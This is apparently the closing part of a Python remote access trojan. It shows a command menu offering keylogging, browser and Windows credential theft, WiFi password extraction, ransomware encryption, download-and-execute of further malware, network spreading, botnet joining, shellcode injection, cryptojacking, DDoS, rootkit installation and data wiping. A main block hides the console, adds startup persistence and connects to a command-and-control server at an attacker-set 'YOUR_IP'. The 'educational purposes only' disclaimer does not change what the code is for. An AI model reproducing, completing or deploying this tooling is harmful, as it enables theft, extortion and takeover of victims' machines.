- keylogger_dump        - Get keylogger data
- browser_credentials   - Harvest browser credentials
- wifi_passwords        - Extract WiFi passwords
- privilege_escalation  - Attempt privilege escalation
- network_recon         - Perform network reconnaissance
- clipboard_monitor_start - Start clipboard monitoring
- clipboard_monitor_dump - Dump clipboard log
- file_list [path]      - List files in directory
- file_read [path]      - Download a file
- powershell [cmd]      - Execute PowerShell command
- ransomware_encrypt [path] [key] - Encrypt files (ransomware)
- ransomware_decrypt [path] [key] - Decrypt files (ransomware)
- deploy_malware [url]  - Download and execute additional malware
- network_spread        - Spread to other network devices
- botnet_join [url]     - Join a botnet
- shellcode_inject [pid] [shellcode] - Inject shellcode into process
- cryptojack_start      - Start cryptojacking
- cryptojack_stop       - Stop cryptojacking
- ddos_start [target] [port] - Start DDoS attack
- ddos_stop             - Stop DDoS attack
- remote_desktop_start  - Start remote desktop control
- remote_desktop_stop   - Stop remote desktop control
- file_infect [path]    - Infect executable files in directory
- data_wipe [path]      - Securely wipe files or partitions
- rootkit_install       - Install basic rootkit
- process_kill [pid]    - Kill a process by PID
- screen_lock           - Lock victim’s screen
- screen_unlock         - Unlock victim’s screen
- cred_stealer          - Harvest credentials from Windows Credential Manager
- install_file [url] [path] - Install file from URL to specified path

[⚠️] IMPORTANT:
- Replace 'YOUR_IP' in RAT.py before generating payload
- For educational purposes only
- Use responsibly and legally

[📁] Output files will be saved in current directory
''')

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--generate":
        generate_payload()
    else:
        hide_console()
        add_to_startup()
        connect_to_c2()